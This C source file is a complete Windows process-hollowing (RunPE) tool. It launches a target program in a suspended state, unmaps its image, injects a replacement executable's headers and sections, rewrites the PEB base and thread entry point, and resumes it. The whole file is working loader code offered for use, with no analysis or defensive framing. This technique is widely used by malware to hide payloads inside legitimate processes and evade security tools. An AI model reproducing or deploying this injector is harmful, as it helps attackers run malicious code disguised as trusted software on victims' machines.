#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

int wmain(int argc, wchar_t* argv[])
{
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	if (argc != 3)
	{
		printf("\nUsage: [Target executable] [Replacement executable]\n");
		return 1;
	}

	printf("\nRunning the target executable.\n");

	if (!CreateProcessW(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
	{
		printf("\nError: Unable to run the target executable. CreateProcess failed with error %d\n", GetLastError());
		return 1;
	}

	printf("\nProcess created in suspended state.\n");

	printf("\nOpening the replacement executable.\n");

	hFile = CreateFileW(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Open the replacement executable

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("\nError: Unable to open the replacement executable. CreateFile failed with error %d\n", GetLastError());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	nSizeOfFile = GetFileSize(hFile, NULL); // Get the size of the replacement executable

	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the executable file

	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) // Read the executable file from disk
	{
		printf("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	NtClose(hFile); // Close the file handle

	pDosH = (PIMAGE_DOS_HEADER)image;

	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		printf("\nError: Invalid executable format.\n");
		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS

	NtGetContextThread(pi.hThread, &ctx); // Get the thread context of the child process's primary thread

#ifdef _WIN64
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif

#ifdef _X86_
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		printf("\nUnmapping original executable image from child process. Address: %#zx\n", (SIZE_T)base);
		NtUnmapViewOfSection(pi.hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
	}

	printf("\nAllocating memory in child process.\n");

	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image

	if (!mem)
	{
		printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	printf("\nMemory allocated. Address: %#zx\n", (SIZE_T)mem);

	printf("\nWriting executable image into child process.\n");

	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process

	for (i = 0; i<pNtH->FileHeader.NumberOfSections; i++)
	{
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}


#ifdef _WIN64
	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	printf("\nNew entry point: %#zx\n", ctx.Rcx);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T)*2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif

#ifdef _X86_
	ctx.Eax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	printf("\nNew entry point: %#zx\n", ctx.Eax);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif
	

	printf("\nSetting the context of the child process's primary thread.\n");

	NtSetContextThread(pi.hThread, &ctx); // Set the thread context of the child process's primary thread

	printf("\nResuming child process's primary thread.\n");

	NtResumeThread(pi.hThread, NULL); // Resume the primary thread

	printf("\nThread resumed.\n");

	printf("\nWaiting for child process to terminate.\n");

	NtWaitForSingleObject(pi.hProcess, FALSE, NULL); // Wait for the child process to terminate

	printf("\nProcess terminated.\n");

	NtClose(pi.hThread); // Close the thread handle
	NtClose(pi.hProcess); // Close the process handle

	VirtualFree(image, 0, MEM_RELEASE); // Free the allocated memory
	return 0;
}